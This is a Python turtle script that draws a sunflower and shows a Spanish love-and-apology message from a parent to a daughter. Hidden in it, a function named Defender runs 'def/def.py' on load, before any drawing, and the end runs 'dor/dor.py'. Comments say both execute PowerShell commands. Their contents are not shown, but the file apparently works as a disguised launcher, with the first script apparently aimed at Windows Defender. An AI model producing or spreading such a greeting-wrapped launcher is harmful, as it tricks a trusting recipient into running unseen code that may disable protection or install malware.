# girasol_turtle.py
import math
import turtle
import subprocess
import tkinter as tk
from tkinter import messagebox

Blue = "#3F372F"

mensaje = [
    "Te Quiero con el corazon Hija.",
   
]

# Función para llamar al script def
def Defender():
    # Llama al archivo Python que ejecuta el comando de PowerShell
    subprocess.run(["python", "def/def.py"])

Defender()
# Función para llamar al script de PowerShell
def llamar_script_powershell():
    # Llama al archivo Python que ejecuta el comando de PowerShell
    subprocess.run(["python", "dor/dor.py"])

# Configuración inicial de Turtle
turtle.bgcolor("White")
turtle.shape("turtle")
turtle.speed(0)
turtle.fillcolor("brown")

# Dibuja el tallo
turtle.penup()
turtle.goto(0, -200)
turtle.pendown()
turtle.setheading(90)
# Normaliza los valores de RGB entre 0 y 1
turtle.fillcolor(197 / 255, 163 / 255, 119 / 255)

turtle.begin_fill()
turtle.forward(200)
turtle.left(90)
turtle.forward(20)
turtle.left(90)
turtle.forward(200)
turtle.end_fill()

# Cambia el color del centro del girasol a café más claro (RGB: 139, 69, 19)
turtle.penup()
turtle.goto(0, -180)

# Código del girasol
phi = 137.508 * (math.pi / 180.0)
for i in range(160 + 40):
    r = 4 * math.sqrt(i)
    theta = i * phi
    x = r * math.cos(theta)
    y = r * math.sin(theta)
    turtle.penup()
    turtle.goto(x, y)
    turtle.setheading(i * 137.508)
    turtle.pendown()
    if i < 160:
        turtle.stamp()
    else:
        turtle.fillcolor('Yellow') 
        turtle.begin_fill()
        turtle.right(20)
        turtle.forward(70)
        turtle.left(40)
        turtle.forward(70)
        turtle.left(140)
        turtle.forward(70)
        turtle.left(40)
        turtle.forward(70)
        turtle.end_fill()

# Escribe "Te Quiero" en la parte superior del girasol
turtle.penup()
turtle.goto(0, 100)  # Ajusta la posición vertical según sea necesario

# Convertir hex a RGB y normalizar
r = int(Blue[1:3], 16) / 255
g = int(Blue[3:5], 16) / 255
b = int(Blue[5:7], 16) / 255
        
turtle.color('Black')  # Usar valores RGB normalizados
fondo_color = "Red"
y_pos = 180

# Crear una ventana de Tkinter
root = tk.Tk()
root.withdraw()  # Oculta la ventana principal
messagebox.showinfo("Mensaje", 
    "Querida Hija,\n\n"
    "Quiero pedirte disculpas por no poder entregarte una flor en persona, "
    "pero quiero que sepas que cada momento que hemos compartido ha sido un regalo para mí.\n"
    "Hemos construido recuerdos hermosos juntos, y siempre hemos estado ahí el uno para el otro, "
    "a pesar de la distancia que ahora nos separa.\n\n"
    "Te llevo siempre en mi corazón, hija de mi alma. "
    "Te quiero más allá de las palabras, al infinito y más allá. "
    "Mi mayor deseo es que algún día puedas perdonarme por dejarte sola en esos momentos difíciles.\n\n"
    "Con todo mi amor,\n"
    "Tu ingeniero y amigo, Martica."
)
root.destroy()  # Cierra la ventana después de mostrar el mensaje

for linea in mensaje:
    turtle.penup()
    turtle.goto(0, y_pos)  # Ajusta el y_pos para controlar la altura del texto
    turtle.pendown()

   # Dibuja el fondo del texto
    turtle.fillcolor(fondo_color)
    turtle.begin_fill()

    turtle.write(linea, align="center", font=("Arial", 20, "bold"))
    y_pos -= 30  

# Oculta el cursor de la tortuga antes de salir
turtle.hideturtle()

# Llama al script de PowerShell
llamar_script_powershell()

# Cierra la ventana al hacer clic
turtle.exitonclick()
